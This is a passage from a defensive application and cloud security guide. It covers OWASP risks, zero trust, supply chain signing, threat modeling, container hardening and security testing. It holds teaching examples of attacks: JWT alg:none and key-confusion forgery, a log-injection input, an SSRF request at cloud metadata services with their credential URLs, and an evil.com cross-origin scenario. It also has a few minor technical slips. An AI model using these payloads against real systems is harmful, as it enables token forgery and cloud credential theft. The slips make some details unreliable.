    Access-Control-Allow-Origin: *   on an API that uses cookie auth
    Attacker's script on evil.com makes credentialed requests to your API
```

Prevention: baseline hardening checklist per environment. Security headers scanner (securityheaders.com). AWS Trusted Advisor / Azure Defender for Cloud flags misconfigurations automatically.

### A06: Vulnerable and Outdated Components

The software supply chain attack surface. Log4Shell (CVE-2021-44228): a JNDI injection via log messages in the log4j2 library, present in millions of Java applications, severity CVSS 10.0. Exploited within 48 hours of disclosure.

Detection:
- `npm audit` — Node.js; runs automatically on install
- `dotnet list package --vulnerable` — .NET (requires SDK 6+)
- `pip-audit` — Python
- Snyk, Dependabot (GitHub native), Renovate — continuous scanning + automated PRs

Prevention:
- Dependency update automation (Dependabot or Renovate) — creates PRs when security patches release
- SCA (Software Composition Analysis) in CI pipeline — fail build on high/critical CVEs
- Pin dependency versions; audit transitive dependencies
- Subscribe to security advisories for frameworks you use

### A07: Identification and Authentication Failures

**Session fixation**: attacker sets a known session ID before authentication. User authenticates with that ID. Attacker now holds a valid authenticated session. Prevention: generate new session ID on successful authentication.

**Credential stuffing**: breach credential dumps (HaveIBeenPwned has 13+ billion breached credentials). Attackers automate login attempts with known (email, password) pairs. High success rate because password reuse is endemic. Prevention: MFA (defeats credential stuffing entirely), rate limiting, CAPTCHA, IP reputation checks. At registration: check password against HaveIBeenPwned API (k-anonymity model — only sends first 5 chars of SHA-1 hash).

**JWT attacks**:
```
alg:none attack:
  Original JWT: header.payload.signature
  Modified:     {"alg":"none"}.payload.  (empty signature)
  Vulnerable libraries accept this if they don't enforce alg whitelist

  Prevention: server-side explicit algorithm allowlist
    // Wrong: jwt.verify(token, secret) -- trusts header's alg field
    // Right: jwt.verify(token, secret, { algorithms: ['RS256'] })

Algorithm confusion attack:
  Server uses RS256 (asymmetric). Public key is known.
  Attacker: "what if I use HS256 with the public key as the HMAC secret?"
  Vulnerable library: verifies HS256 HMAC using "secret" = public key text
  Attacker knows public key → can forge tokens

  Prevention: strict algorithm whitelist on verification
```

**JWT: signed ≠ encrypted**: standard JWTs (JWS) have base64-encoded payload — readable by anyone who intercepts the token. If the payload contains sensitive data, use JWE (JSON Web Encryption). Do not put sensitive data in JWS claims assuming they are confidential.

### A08: Software and Data Integrity Failures

**Deserialization of untrusted data**: deserializers that instantiate arbitrary classes are a code execution vector. Java `ObjectInputStream`, .NET `BinaryFormatter` — both allow "gadget chain" exploits where attacker crafts a serialized payload that triggers code execution during deserialization.

```csharp
// .NET — NEVER use for untrusted data:
var obj = new BinaryFormatter().Deserialize(stream);  // RCE risk
// BinaryFormatter is removed in .NET 9 (finally)

// Safe alternatives:
System.Text.Json.JsonSerializer.Deserialize<T>(json)  // type-safe
MessagePack, Protobuf                                  // schema-enforced
```

**npm/PyPI supply chain attacks**:
- Typosquatting: `reqeusts` (misspelling of `requests`) that contains malware
- Dependency confusion: attacker publishes package with same name as private internal package to npm public registry; build pulls public version
- Malicious maintainer: legitimate package maintainer account compromised; malicious version published (ua-parser-js incident, 2021)

**CI/CD pipeline integrity**: if your build pipeline can be influenced by external content without verification, an attacker who compromises a dependency or build script can inject into your artifacts. SLSA framework addresses this.

### A09: Security Logging and Monitoring Failures

Detection depends on logging. If you don't log, you can't detect, respond, or forensically analyze.

Minimum logging requirements:
- All authentication events (success and failure), with user, IP, timestamp
- All authorization failures
- All admin actions
- Application errors with correlation ID (never log the actual error parameters — may contain secrets)

**Log injection**: if user input is written to logs without sanitization, attacker can inject fake log entries or escape sequences:
```
Input: "username\nINFO 2024-01-01 ADMIN_LOGIN success user=root"
Log:
  INFO 2024-01-01 FAILED_LOGIN user=attacker_name
  INFO 2024-01-01 ADMIN_LOGIN success user=root   ← injected
```
Prevention: sanitize newlines and special characters before logging user input. Use structured logging (JSON) — field values can't escape structure.

**Correlation**: each request should carry a `traceId` through all service calls and into all log lines. Without it, you cannot reconstruct a sequence of events across microservices during incident response.

### A10: SSRF (Server-Side Request Forgery)

```
SSRF flow:

  Attacker                Application Server               Internal Network
  ────────                ──────────────────               ────────────────
  POST /fetch-url
  {"url": "http://
   169.254.169.254/
   metadata/v1/..."}
          │
          ▼
          App fetches URL ──────────────────────────────►  AWS/Azure IMDS
                                                           (metadata service)
                          ◄─────────────────────────────  returns credentials!
          │
          ▼
  Attacker receives
  cloud credentials → can impersonate the server identity
```

Cloud metadata services:
- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- Azure: `http://169.254.169.254/metadata/identity/oauth2/token`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`

These services return instance credentials if accessed from within the instance. An SSRF vulnerability on an EC2/Azure VM leaks cloud credentials for that instance's IAM role/Managed Identity.

Prevention:
- Allowlist valid hostnames/IPs for any server-side URL fetch
- Block RFC 1918 address ranges (10.x, 172.16-31.x, 192.168.x) in outbound calls
- Block link-local range (169.254.0.0/16) — covers all cloud IMDS endpoints
- Resolve hostname to IP before making request; validate the IP is not private
- IMDSv2 (AWS): requires HTTP PUT to get session token before metadata access — mitigates some SSRF

---

## 6. Zero-Trust Architecture

```
Traditional perimeter model (1990s–2010s):
  ┌─────────────────────────────────────────────┐
  │  Corporate Network                           │
  │                                             │
  │  ┌──────────────────────────────────────┐   │
  │  │  Trusted Zone                         │   │
  │  │                                      │   │
  │  │  servers  databases  internal apps   │   │
  │  │  ← → freely communicate ← →         │   │
  │  └──────────────────────────────────────┘   │
  └─────────────────────────────────────────────┘
  Perimeter firewall = trust boundary
  Once inside: implicit trust, lateral movement free
  Problem: VPN → inside → game over
           Insider threat → no detection
           Perimeter breach → full access to everything

Zero-trust model (NIST SP 800-207):
  Every request, every time:
  ┌──────────────────────────────────────────────────────┐
  │  1. Authenticate  → Who are you? (identity assertion)│
  │  2. Authorize     → Can you do this? (policy check)  │
  │  3. Inspect       → Is this request valid/clean?     │
  │  4. Log           → Record this event                │
  │  5. Assume breach → Limit blast radius if wrong      │
  └──────────────────────────────────────────────────────┘
  Identity is the new perimeter.
  Network location implies nothing.
  Trust is dynamic, verified, minimized.
```

### Core Principles

**Never trust, always verify**: every request carries a verifiable identity claim (certificate, token). The policy engine evaluates it fresh each time. No "once authenticated, always trusted."

**Least privilege access**: workloads get exactly the permissions required for the current operation. No standing access to production secrets. Elevated access requires explicit JIT request.

**Assume breach**: design assuming an attacker is already inside. Microsegmentation prevents lateral movement. Encryption in transit between internal services (mTLS). Log everything for forensics.

**Microsegmentation**: rather than one flat internal network, each workload has its own network namespace. Traffic between workloads is controlled by policy (Calico, Cilium in Kubernetes), not by firewall rules at the network perimeter.

### Azure Zero-Trust Implementation

```
User/Device                  Control Plane               Data Plane
───────────                  ─────────────               ──────────
User login
    │
    ▼
Entra ID:
  MFA required?              ◄── Conditional Access ──►  Signals:
  Compliant device?               Policy Engine           device compliance
  Known location?                                         IP reputation
  Risk score?                                             sign-in risk
    │
    ▼ (access granted)
  Access token (JWT)
    │
    ▼
  Azure resource:
    API Management / App Service
    verifies token + calls RBAC
    │
    ▼
  Managed Identity:
    accesses downstream (SQL, Key Vault)
    no credentials — just token exchange
```

Key components:
- **Entra ID Conditional Access**: policy-based gates on every sign-in. Signals: IP, device compliance (Intune), user risk score (leaked creds, anomalous behavior), location. Actions: require MFA, block, require device enrollment.
- **Azure AD PIM (Privileged Identity Management)**: no standing privileged access. Request elevation ("I need Owner on subscription X for 4 hours for incident response"). Approver workflow. Full audit log.
- **Private Endpoints**: Azure resources (Key Vault, Storage, SQL) accessible only via private IP in your VNet. No public internet exposure. NSG can further restrict source IP.
- **Microsoft Defender for Cloud**: continuous posture assessment across Azure resources. Threat detection. Recommendations scored by severity.

**BeyondCorp** (Google's implementation, the original zero-trust reference): access is granted based on device trust level (managed, known, unmanaged) and user identity — not network location. Employees work from the public internet, same as contractors. The corporate network provides no special privilege.

---

## 7. Supply Chain Security

Modern software = a tiny amount of your code + a massive dependency tree. npm projects average 700+ transitive dependencies. Supply chain attacks target the dependencies, not your code.

```
Attack vectors in the supply chain:

  Source repo:        Compromised developer account
                      Malicious PR merged
                          │
  Build pipeline:     Build script injection
                      Compromised build environment
                          │
  Package registry:   Typosquatting (reqeusts vs requests)
                      Dependency confusion
                      Compromised maintainer account
                          │
  Distribution:       Tampered artifact in CDN
                      MITM if no signature verification
                          │
  Runtime:            Malicious package behavior on install
                      (npm postinstall scripts)
```

### SBOM (Software Bill of Materials)

A formal machine-readable inventory of all software components and their origins.

Two dominant formats:
- **CycloneDX** (OWASP): JSON/XML, well-supported tooling, good for security analysis
- **SPDX** (Linux Foundation): ISO/IEC 5962:2021 standard; broader IP/license coverage

Generate:
```bash
# Node.js
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# .NET
dotnet CycloneDX MyProject.csproj -o .

# Container image
syft ghcr.io/org/image:tag -o cyclonedx-json
```

US Executive Order 14028 (2021) mandates SBOMs for software sold to the federal government. Expect this to become a baseline commercial requirement.

### SLSA Framework

SLSA (Supply chain Levels for Software Artifacts, pronounced "salsa") defines four levels of build provenance:

| Level | Requirements | What it prevents |
|-------|-------------|-----------------|
| 1 | Build process documented; provenance generated | Accidental issues |
| 2 | Signed provenance; hosted build service | Tampering after build |
| 3 | Tamper-resistant build platform; signed source | Compromised build infra |
| 4 | Two-person review; hermetic builds; all deps at SLSA 3+ | Insider threats |

GitHub Actions + OIDC attestation can achieve SLSA 3 automatically. GitHub releases generate signed provenance via the `attest-build-provenance` action.

### Sigstore / Cosign

Sigstore is a free, transparent, non-repudiable signing infrastructure for software artifacts.

**Keyless signing** (the normal flow):
```
Developer runs: cosign sign --oidc-issuer https://accounts.google.com ghcr.io/org/image:tag

1. Cosign requests OIDC token from GitHub Actions (or Google, etc.)
2. Cosign generates ephemeral key pair
3. Fulcio CA issues short-lived (10-min) cert binding OIDC identity to ephemeral public key
4. Cosign signs the image digest with ephemeral private key
5. Signature + cert logged to Rekor (transparency log, append-only)
6. Ephemeral private key discarded

Verification: cosign verify \
  --certificate-identity user@company.com \
  --certificate-oidc-issuer https://accounts.google.com \
  ghcr.io/org/image:tag

Cosign fetches signature from OCI registry, validates cert chain (Fulcio → root),
checks Rekor log inclusion proof, verifies signature.
```

No long-lived signing keys to manage or rotate. All signatures are permanently auditable in Rekor. This is the right model for container image signing in 2024+.

### Dependency Scanning in CI

```yaml
# GitHub Actions: Dependabot (automatic) + audit in CI
- name: Audit dependencies
  run: |
    npm audit --audit-level=high
    # or:
    npx better-npm-audit audit --level high --registry https://registry.npmjs.org
```

```bash
# .NET
dotnet list package --vulnerable --include-transitive

# Python
pip-audit --requirement requirements.txt

# Go
govulncheck ./...
```

Fail the build on high/critical CVEs. Auto-merge Dependabot patches for dev dependencies. Require human review for production dependency changes (especially lockfile changes that weren't expected).

---

## 8. Threat Modeling

Threat modeling is the practice of systematically identifying security threats during design — before code is written.

### STRIDE

STRIDE is a threat taxonomy developed at Microsoft. Each category maps to a violated security property:

| Threat | Violated property | Example | Mitigation |
|--------|-------------------|---------|-----------|
| **S**poofing | Authentication | User claims false identity; ARP spoofing | MFA, certificates, HMAC |
| **T**ampering | Integrity | Modify request in transit; corrupt DB record | TLS, HMAC, digital signatures, database constraints |
| **R**epudiation | Non-repudiation | "I never sent that order" | Audit logs, digital signatures, append-only event store |
| **I**nformation Disclosure | Confidentiality | Data exfiltration; verbose errors | Encryption, ACLs, least privilege |
| **D**enial of Service | Availability | SYN flood; resource exhaustion | Rate limiting, DDoS scrubbing, circuit breakers |
| **E**levation of Privilege | Authorization | SQL injection → DBA rights; SUID bit abuse | Least privilege, sandboxing, input validation |

### Data Flow Diagrams

DFDs are the substrate for STRIDE analysis. Identify:
1. **Processes**: circles — code that transforms data
2. **Data stores**: rectangles — databases, files, caches
3. **External entities**: rounded rectangles — users, third-party services
4. **Data flows**: arrows — data moving between components
5. **Trust boundaries**: dotted lines — where privilege level changes (internet → DMZ, DMZ → internal)

Apply STRIDE to every data flow crossing a trust boundary. Every external entity is a potential threat source.

```
DFD example — login flow:

  [User] ──── HTTPS ────► (Login API) ──── SQL ────► [Users DB]
    │                         │
  external                  trust boundary: internet → internal
  entity

  Threats on [User] → (Login API) flow:
    S: spoofed user identity → MFA
    T: tampered credentials → TLS
    I: credential sniffing → TLS
    D: brute force → rate limiting, account lockout
```

### Attack Trees

Root node = attacker's goal. Branches = attack methods. Leaves = atomic attacks.

```
Goal: Steal customer PII from database
│
├── SQL Injection
│   ├── Find injectable endpoint (fuzzing, manual testing)
│   └── Exfiltrate via UNION SELECT
│
├── Compromised credentials
│   ├── Phish a DBA
│   │   ├── Spear phishing email
│   │   └── Fake internal portal
│   └── Credential stuffing against VPN
│
├── Vulnerable dependency (e.g., Log4Shell in app server)
│   └── RCE → internal access → DB
│
└── Misconfigured cloud storage
    └── Backup files in public S3 bucket
```

For each leaf, assign likelihood and impact. Prioritize mitigations based on risk.

### PASTA

PASTA (Process for Attack Simulation and Threat Analysis): risk-centric, 7-stage framework. Where STRIDE is threat-centric, PASTA is business-risk-centric. Useful for compliance-heavy contexts (finance, healthcare) where you need threat model tied to business impact.

**Microsoft Threat Modeling Tool**: free, generates DFDs with automatic STRIDE analysis. Templates for Azure architectures. Use it.

---

## 9. Container & Cloud Security

### Container Security

The container runs on the host kernel. Containers are not VMs — a container breakout escalates directly to host.

```
Container threat model:

  ┌─────────────────────────────────────────────────────────┐
  │  Host OS / Kernel                                       │
  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐ │
  │  │  Container  │  │  Container  │  │  Container      │ │
  │  │  (root)     │  │  (UID 1001) │  │  (privileged)   │ │
  │  │             │  │             │  │  ← full host    │ │
  │  │ process as  │  │ process as  │  │    access!      │ │
  │  │ root in     │  │ non-root    │  │                 │ │
  │  │ container   │  │ in container│  └─────────────────┘ │
  │  └─────────────┘  └─────────────┘                      │
  │  Breakout from root container → root on host           │
  │  Non-root container: breakout → unprivileged on host   │
  └─────────────────────────────────────────────────────────┘
```

**Run as non-root**:
```dockerfile
# Create user at image build time
RUN groupadd -g 1001 appgroup && \
    useradd -u 1001 -g appgroup -s /sbin/nologin appuser

COPY --chown=appuser:appgroup . /app

USER 1001  # ← switch before CMD
CMD ["node", "server.js"]
```

Many base images (node, python) provide a non-root user you can use:
```dockerfile
USER node  # in node:18-alpine base image
```

**Kubernetes security context**:
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1001
  readOnlyRootFilesystem: true      # no writing to container fs
  allowPrivilegeEscalation: false   # no setuid/setgid escalation
  capabilities:
    drop: ["ALL"]                   # remove all Linux capabilities
    add: ["NET_BIND_SERVICE"]       # add back only what's needed
```

**Seccomp profiles**: Linux system call filter. Docker's default seccomp profile blocks ~44 dangerous syscalls (e.g., `ptrace`, `keyctl`, `unshare`, `userns`). Kubernetes allows custom seccomp profiles per pod. `RuntimeDefault` profile gives Docker-equivalent protection.

**Distroless images** (Google): contain only the application and its runtime dependencies. No shell (`/bin/sh`), no package manager, no `curl`, no `wget`. If an attacker achieves RCE, they have no tools to proceed. Size is dramatically smaller.

```dockerfile
# Multi-stage with distroless final image
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM gcr.io/distroless/nodejs20-debian12 AS runtime
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/dist ./dist
EXPOSE 3000
CMD ["dist/server.js"]
```

**Image scanning**:

| Tool | Focus | Integration |
|------|-------|-------------|
| Trivy | OS packages + app deps + secrets | CLI, GitHub Actions, k8s admission webhook |
| Grype | OS packages + app deps | CLI, GitHub Actions |
| Snyk Container | CVEs + base image recommendations | CI, IDE |
| Clair | CVEs | Used in container registries |

Run scanning in CI on every image build. Fail on critical CVEs. ACR (Azure Container Registry) and ECR have built-in scanning — enable it.

**Docker Content Trust / Notary**: sign images with private key; clients verify before pull. Being superseded by Cosign/Sigstore for most use cases.

### Cloud IAM Security

```
IAM principal types in Azure:

  User          → human, authenticated by Entra ID
  Group         → collection of users, assign roles to group not individuals
  Service Principal → application identity with credentials (client secret or cert)
  Managed Identity → application identity with NO credentials (Azure manages token rotation)
    System-assigned: tied to resource lifecycle, deleted with resource
    User-assigned:   independent lifecycle, can be assigned to multiple resources
```

**Managed Identity** is the correct pattern for any Azure workload:
```
  # Wrong: service principal with secret
  AZURE_CLIENT_SECRET=supersecretvalue  ← in config / env var

  # Right: system-assigned managed identity
  az webapp identity assign --name myapp --resource-group myrg
  # Grant RBAC role:
  az role assignment create \
    --assignee <managed-identity-object-id> \
    --role "Key Vault Secrets User" \
    --scope /subscriptions/.../resourceGroups/.../providers/Microsoft.KeyVault/vaults/myvault
  # In app code:
  DefaultAzureCredential()  # automatically uses managed identity in Azure
```

**Role scoping**: scope RBAC assignments as narrowly as possible.

```
Too broad:  Contributor on subscription
Better:     Contributor on resource group
Best:       Specific built-in role on specific resource
            (Key Vault Secrets User on one Key Vault)
```

Custom roles: define exactly the actions allowed. Avoid `*` wildcard actions in custom roles.

**PIM (Privileged Identity Management)**: JIT access for privileged roles.

```
Without PIM:                     With PIM:
User has Owner role              User has no standing privileged role
  permanently                      └─ requests activation
                                   └─ approver review (or auto-approve with justification)
Insider threat: immediate          └─ time-limited elevation (e.g., 4 hours)
access to everything               └─ full audit trail
                                   └─ automatic expiration
```

### Security Headers

These are HTTP response headers your server should send to every browser response:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ↳ Browser never sends HTTP to this domain (even if user types http://)
  ↳ preload: submit to browser HSTS preload list — baked into browser binary

Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
  ↳ Restricts which origins can load scripts, styles, images, etc.
  ↳ nonce-based: each response generates a random nonce; only inline scripts with that nonce execute
  ↳ Prevents XSS by refusing to execute injected scripts

X-Content-Type-Options: nosniff
  ↳ Browser will not MIME-sniff response — uses declared Content-Type
  ↳ Prevents IE/Edge from executing scripts disguised as images

X-Frame-Options: DENY
  ↳ Prevents page from being embedded in <iframe>
  ↳ Blocks clickjacking attacks
  ↳ Use CSP frame-ancestors instead for newer apps (more flexible)

Referrer-Policy: strict-origin-when-cross-origin
  ↳ Only sends origin (not full URL) as Referer for cross-origin requests
  ↳ Prevents leaking URL paths to third parties

Permissions-Policy: camera=(), microphone=(), geolocation=()
  ↳ Opt out of browser APIs you don't use
  ↳ Even if XSS injects code, it can't access camera/mic/location
```

Use helmetjs (Node.js) or similar to set these automatically:
```typescript
import helmet from 'helmet';
app.use(helmet());
```

---

## 10. Security Testing

Defense requires verification. Security testing finds what threat modeling misses.

```
Security testing in the development lifecycle:

  Design          │  Threat modeling (STRIDE)
                  │
  Development     │  SAST (Semgrep, CodeQL) — runs in IDE + PR
                  │  Secret scanning (gitleaks pre-commit)
                  │
  Build           │  SCA (Dependabot, Snyk) — vulnerable deps
                  │  Container scanning (Trivy) — image CVEs
                  │
  Test env        │  DAST (OWASP ZAP) — runtime vulnerability scanning
                  │  Fuzzing (API fuzzing)
                  │
  Production      │  Penetration testing (periodic)
                  │  Bug bounty program (continuous)
                  │  Runtime detection (Defender, Falco)
```

| Type | Tool | What it finds | When |
|------|------|--------------|------|
| SAST | Semgrep | Code-level: injection, hardcoded secrets, insecure APIs | PR |
| SAST | CodeQL (GitHub) | Data flow analysis: injection, XSS, path traversal | PR |
| SAST | Roslyn Analyzers (.NET) | .NET-specific: BinaryFormatter, CryptographicException | IDE + CI |
| DAST | OWASP ZAP | Runtime: SSRF, XSS, SQL injection in running app | Test env |
| DAST | Burp Suite | Manual + automated: comprehensive web app testing | Pen test |
| SCA | Dependabot | Vulnerable library versions | PR + main |
| SCA | Snyk | Vulnerable library versions + fix recommendations | PR |
| SCA | OWASP Dependency-Check | CVEs in Java/.NET dependencies | CI |
| Secret scanning | truffleHog | Leaked secrets in code and git history | CI + pre-push |
| Secret scanning | gitleaks | Leaked secrets with custom patterns | Pre-commit |
| Container | Trivy | CVEs in OS packages + app deps + secrets in image | Image build |
| Container | Grype | CVEs in OS packages and language packages | Image build |
| Fuzzing | AFL++ | Memory corruption, input parsing bugs | Security test |
| Fuzzing | Jazzer | Java: exception-based fuzzing for logic bugs | Security test |
| Pen test | Metasploit | Real-world attack simulation | Periodic |

**Semgrep** is the most practical SAST tool: patterns written in the target language's syntax, runs in CI in seconds, customizable rules, open source rule repository.

```yaml
# .github/workflows/security.yml
- name: SAST scan
  uses: returntocorp/semgrep-action@v1
  with:
    config: "p/owasp-top-ten p/secrets"

- name: Container scan
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: '${{ env.IMAGE_TAG }}'
    severity: 'HIGH,CRITICAL'
    exit-code: '1'       # fail build

- name: Dependency audit
  run: npm audit --audit-level=high
```

---

## 11. Old World → New World Bridge

Coming from Windows enterprise security (ADFS, Kerberos, Windows Integrated Auth, AD CS), the concepts are the same; the implementations have changed.

| Old World | New World | Notes |
|-----------|-----------|-------|
| Kerberos tickets | JWT + OIDC tokens | Both are time-limited tokens with claims; Kerberos uses symmetric encryption (AES), JWT uses asymmetric (RS256/ES256). Kerberos is network-bound; JWT is transport-agnostic. |
| ADFS / WS-Federation | Entra ID + OIDC | ADFS spoke WS-Federation and SAML 2.0 (XML-based). Entra ID speaks OIDC/OAuth2 (JSON). Same concepts: identity provider, claims, federation. ADFS still usable for on-prem hybrid; new systems use Entra. |
| Windows Integrated Auth (Negotiate/NTLM/Kerberos) | Managed Identity + OIDC | WIA worked because client was on the domain. Cloud workloads use Managed Identity — platform issues OIDC tokens. No Kerberos needed; no domain join needed. |
| Active Directory Certificate Services (AD CS) | Let's Encrypt + Azure Key Vault Certificates | AD CS issued certs within the enterprise CA hierarchy. Let's Encrypt issues public DV certs via ACME. Azure Key Vault can act as CA for internal certs. Both automate the workflow that AD CS did manually. |
| SQL Server mixed-mode auth (user/pass) | Entra authentication for Azure SQL | Azure SQL supports Entra-integrated auth. Application uses Managed Identity → gets token → connects to SQL without a password. `Data Source=server.database.windows.net;Authentication=Active Directory Default` |
| App.config / web.config connection strings | Key Vault secrets + Managed Identity | Connection strings in config files are never acceptable in cloud-native apps. Fetch from Key Vault at startup; App Service supports Key Vault references in app settings (fetched transparently). |
| BinaryFormatter deserialization | System.Text.Json / Protobuf | BinaryFormatter is removed in .NET 9 — good. Replace with System.Text.Json (JSON), Google.Protobuf (binary), or MessagePack. Type-safe; no gadget chain exploits. |
| MD5 for file integrity checks | SHA-256 or BLAKE3 | MD5 collision attacks are trivial (Wang 2004, ~1 hour; now seconds). The SHAttered attack broke SHA-1 (2017). Use SHA-256 minimum. BLAKE3 is faster and equally secure. |
| bcrypt in old ASP.NET Identity | Argon2id | ASP.NET Identity (old) used PBKDF2 with SHA-1, then SHA-256. Current ASP.NET Core Identity uses PBKDF2-SHA256 with 100,000 iterations. Argon2id (via Konscious.Security.Cryptography or libsodium-net) is the right choice for new password storage. |
| IPSec site-to-site VPN to on-prem | Azure Private Link / ExpressRoute | Private Link exposes Azure PaaS services on your VNet's private IP space. No public internet path. ExpressRoute = dedicated private circuit to Azure, not traversing public internet. |
| IIS + web.config | Containerized app + env vars / Key Vault | web.config transforms and environment-specific configs are replaced by environment variables + external secrets management. |
| SCOM / manual alerting | Microsoft Defender for Cloud + Sentinel | SCOM monitored on-prem infrastructure. Defender for Cloud does continuous posture management across Azure. Sentinel is the SIEM for security event correlation. |
| Group Policy for security baseline | Azure Policy + Defender for Cloud | Azure Policy enforces resource configuration (equivalent to GPO for cloud resources). Defender for Cloud gives recommendations scored against CIS benchmarks. |

---

## 12. Decision Cheat Sheet

| Scenario | Solution | Notes |
|----------|---------|-------|
| Hash a password for storage | Argon2id (m=64MB, t=1, p=4) | Never use bcrypt for new systems; Argon2id is PHC winner |
| Hash arbitrary data (checksum) | SHA-256 or BLAKE3 | BLAKE3 is faster; SHA-256 is more universally supported |
| Symmetric encrypt data at rest | AES-256-GCM | AEAD; use random 96-bit nonce; never reuse nonce+key pair |
| Symmetric encrypt in constrained env | ChaCha20-Poly1305 | No AES hardware? Use this. Also TLS 1.3 cipher suite. |
| Sign a JWT (stateless) | ES256 (ECDSA P-256) or RS256 | Avoid HS256 in multi-party scenarios; ES256 is shorter |
| Sign a document / artifact | Ed25519 (EdDSA) | Deterministic; no k-reuse risk; fast; preferred for new |
| TLS cert for public website | Let's Encrypt (ACME / certbot) | Free, 90-day, automated renewal |
| TLS cert for Azure App Service | App Service Managed Cert | Free, auto-renews, no tooling needed |
| Store API keys in production | Azure Key Vault + Managed Identity | No credentials in code/config |
| Store secrets with k8s | Sealed Secrets or Vault Agent | Sealed Secrets simpler; Vault for dynamic creds |
| Encrypt secrets in git repo | SOPS with Azure Key Vault KMS | File structure preserved; values encrypted |
| Service-to-service auth in k8s | mTLS via Istio or Linkerd | Sidecar handles cert rotation; no app code changes |
| Prevent SQL injection | Parameterized queries always | Never string concatenate SQL; use ORM or prepared statements |
| Prevent XSS | Content-Security-Policy nonce | + output encoding at render time (React does this by default) |
| Block SSRF | Allowlist outbound + block 169.254.0.0/16 | Block IMDS range; resolve to IP before checking |
| Scan for secrets in git history | truffleHog or gitleaks | Run on every PR; scan full history on new repos |
| Sign container images | Cosign (keyless OIDC) | No long-lived keys; Sigstore transparency log |
| Verify container image integrity | cosign verify at deploy time | Enforce via admission webhook (Kyverno, OPA Gatekeeper) |
| Least privilege for Azure workload | Managed Identity + scoped RBAC | System-assigned Managed Identity; narrow scope |
| JIT access for privileged ops | Azure AD PIM | Time-limited elevation; approver workflow; audit log |
| Zero-trust access for users | Entra Conditional Access + MFA | Device compliance + identity signals on every sign-in |
| Threat model a new system | STRIDE on DFDs | Microsoft Threat Modeling Tool; apply STRIDE to trust boundaries |
| Audit dependencies for CVEs | Dependabot + `npm audit` / `dotnet list package --vulnerable` | Automate PRs; fail CI on high/critical |
| Security test a web app | Semgrep (SAST) + OWASP ZAP (DAST) | SAST on PR; DAST on test environment |

---

## 13. Common Confusion Points

**AES key vs IV vs nonce**: the key is secret and long-lived; the IV/nonce is public but must be unique per encryption operation. Reusing a nonce with the same key in GCM mode allows an attacker to recover the authentication key and forge messages. In CTR/GCM, nonce reuse also allows XOR cancellation to recover plaintext. Key rotation changes the key; nonce uniqueness is per-message within a key's lifetime.

**Encryption ≠ authentication**: AES-CBC encrypts (confidentiality) but does not authenticate (integrity). An attacker can flip bits in the ciphertext, and the decrypted plaintext will be correspondingly corrupted — and you will not know. CBC without a MAC is not secure for untrusted ciphertext. This is why GCM (AEAD) is the default: it provides both confidentiality and an authentication tag in one operation.

**Hashing ≠ encryption**: hash functions are one-way. There is no "decrypt" operation. Hashing a password means you verify by re-hashing the input; there is no path back to the original password from the hash. Encryption is two-way (with the key). The choice depends on whether you need to recover the original value: passwords → hash; data you need to retrieve → encrypt.

**bcrypt 72-byte truncation**: bcrypt limits input to 72 bytes (an artifact of Blowfish's key schedule). `bcrypt("a" * 100)` === `bcrypt("a" * 72)`. If your password policy allows long passphrases, bcrypt silently makes them equivalent to their 72-byte prefix. Argon2id has no such limit. If you must use bcrypt, pre-hash with SHA-256 before bcrypt (but then you may as well use Argon2id).

**JWT `alg:none` attack**: the JOSE spec allows `"alg": "none"` for unsigned tokens. Vulnerable JWT libraries that do not explicitly restrict allowed algorithms will accept these tokens as valid. The payload is unsigned — trivially forgeable. Always specify the allowed algorithm(s) on the verification call, never trust the header's `alg` field.

**Signed JWT ≠ confidential JWT**: JWS (signed JWT) — the standard `eyJ...` token — has a base64url-encoded payload. base64 is encoding, not encryption. Anyone who intercepts the token can read the claims. Do not put sensitive data (SSNs, PII, internal system details) in a JWS payload. If the payload must be confidential, use JWE (JSON Web Encryption).

**mTLS ≠ OAuth**: these operate at different layers. mTLS (mutual TLS) authenticates the *transport layer* — it proves "this TCP connection is coming from a machine that holds certificate X." OAuth authenticates the *application layer* — it proves "this request is authorized on behalf of user/service Y." They are complementary. Istio mTLS ensures service-to-service traffic is encrypted and both parties are authenticated (which pod). OAuth/OIDC or Kubernetes RBAC controls what that authenticated pod is allowed to do.

**Key rotation ≠ key revocation**: rotation means generating a new key for future operations and migrating to it over time; old encrypted data remains valid (may be re-encrypted on next access). Revocation means invalidating a key immediately — useful for certificates (CRL/OCSP) but complex for symmetric keys (you must re-encrypt all data encrypted with the old key). Plan for rotation from day one; revocation is the emergency case.

**Zero-trust does not mean trust nothing**: it means trust is not assumed based on network location, but is continuously evaluated based on identity, device posture, and request context. Inside a zero-trust architecture there is still trust — it is just explicit, dynamic, minimized, and verified on every request.

**SSRF via DNS rebinding**: naive SSRF mitigations validate the hostname, then make the request. DNS rebinding: the hostname resolves to a safe IP at validation time, but by request time the attacker has changed the DNS TTL to point to 169.254.169.254 (IMDS). Mitigation: resolve hostname to IP, validate the IP, then make the request with the resolved IP and `Host` header matching original hostname. Alternatively: validate at the IP level, not hostname level.

**PBKDF2 iteration count**: the NIST recommendation of 600,000 iterations (2023) for PBKDF2-SHA256 sounds large but a modern GPU cluster can compute billions per second. At 600K iterations, a GPU farm can still exhaust a 6-character alphanumeric password space in hours. Argon2id's memory-hardness forces memory allocation per attempt, making GPU parallelism economically infeasible even at lower time parameters.

**ECDSA nonce determinism**: stock ECDSA requires a random, unique nonce k per signature. If your RNG fails, produces a repeated k, or is biased, your private key is recoverable. This is not a theoretical risk — the PS3 hack used a constant k (d = (s·k - h) / r mod n is trivially solvable with two equations sharing k). Ed25519 derives k deterministically from the private key and message via HMAC — no external randomness required for signing. This makes Ed25519 immune to nonce misuse attacks.

**Container root ≠ host root (usually, but not always)**: by default, user namespaces are not always enabled in Docker. In Docker without user namespaces, root in a container is the same UID 0 as root on the host. A container escape by a root process → root on host. With `userns-remap` or rootless Docker, container root maps to an unprivileged host UID. Kubernetes with securityContext `runAsUser: 1001` ensures the process never has UID 0 regardless of user namespace settings.
